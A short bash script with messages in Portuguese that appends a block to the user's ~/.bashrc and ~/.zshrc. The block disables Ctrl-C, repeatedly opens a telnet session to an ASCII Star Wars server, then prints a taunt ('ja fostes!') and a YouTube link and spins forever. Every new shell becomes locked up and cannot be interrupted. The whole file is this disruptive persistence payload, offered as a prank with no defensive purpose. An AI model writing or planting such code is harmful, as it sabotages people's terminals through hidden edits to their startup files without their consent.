#!/usr/bin/env bash

BLOCK='
trap "" SIGINT
while true; do
    if ! command -v telnet &> /dev/null; then
        break
    fi
    telnet starwarstel.net
done

echo ja fostes!
echo https://www.youtube.com/watch?v=kibK5g_8uyM
while true; do
    for c in / - \\ \|; do
        printf "\r%s" "$c"
        sleep 0.1
    done
done
'

echo "$BLOCK" >> "$HOME/.bashrc"
echo "Adicionado ao ~/.bashrc"

echo "$BLOCK" >> "$HOME/.zshrc"
echo "Adicionado ao ~/.zshrc"
